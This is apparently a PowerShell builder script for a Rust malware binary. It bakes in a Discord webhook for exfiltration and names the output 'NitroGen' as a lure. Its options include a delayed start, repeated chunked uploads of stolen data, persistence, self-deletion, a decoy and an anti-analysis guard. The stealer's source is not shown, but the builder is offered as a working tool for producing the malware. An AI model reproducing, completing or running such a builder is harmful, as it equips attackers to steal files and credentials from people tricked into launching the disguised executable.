<#
    Builds winagent.exe with a config baked in.

    .\build.ps1 -Webhook "https://discord.com/api/webhooks/ID/TOKEN"
    .\build.ps1 -Webhook "..." -Delay 10 -Repeat 6 -Persist
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][string]$Webhook,
    [string]$Name = "NitroGen",
    [int]$Delay = 0,
    [int]$Repeat = 0,
    [int]$Retry = 30,
    [int]$MaxUpload = 45,
    [int]$Chunk = 8,
    [switch]$Persist,
    [switch]$SelfDelete,
    [switch]$NoGuard,
    [switch]$NoDecoy,
    [switch]$Console
)

$ErrorActionPreference = "Stop"
$root = Split-Path -Parent $MyInvocation.MyCommand.Path
$cargo = Join-Path $env:USERPROFILE ".cargo\bin\cargo.exe"
if (-not (Test-Path $cargo)) { $cargo = "cargo" }

if ($Webhook -notmatch "discord\.com/api/webhooks/") {
    throw "Webhook must be a Discord webhook URL"
}

$flag = { param($on) if ($on) { "1" } else { "0" } }

$lines = @(
    "# Generated by build.ps1 - do not commit.",
    "WEBHOOK=$Webhook",
    "APP_NAME=$Name",
    "DELAY_MINUTES=$Delay",
    "RETRY_MINUTES=$Retry",
    "REPEAT_HOURS=$Repeat",
    "MAX_UPLOAD_MB=$MaxUpload",
    "CHUNK_MB=$Chunk",
    "GUARD=$(& $flag (-not $NoGuard))",
    "PERSIST=$(& $flag $Persist)",
    "SELF_DELETE=$(& $flag $SelfDelete)",
    "DECOY=$(& $flag (-not $NoDecoy))"
)
Set-Content -Path (Join-Path $root "strings.txt") -Value $lines -Encoding UTF8

Push-Location $root
try {
    if ($Console) {
        & $cargo build --features console
        $exe = Join-Path $root "target\debug\rustica.exe"
    }
    else {
        & $cargo build --release
        $exe = Join-Path $root "target\release\rustica.exe"
    }
    if ($LASTEXITCODE -ne 0) { throw "cargo build failed" }

    $dist = Join-Path $root "dist"
    New-Item -ItemType Directory -Force -Path $dist | Out-Null
    $out = Join-Path $dist "$Name.exe"
    Copy-Item $exe $out -Force
    Write-Host "binary -> $out" -ForegroundColor Green
    Write-Host ("size   -> {0:N0} KB" -f ((Get-Item $out).Length / 1KB))
}
finally {
    Pop-Location
}
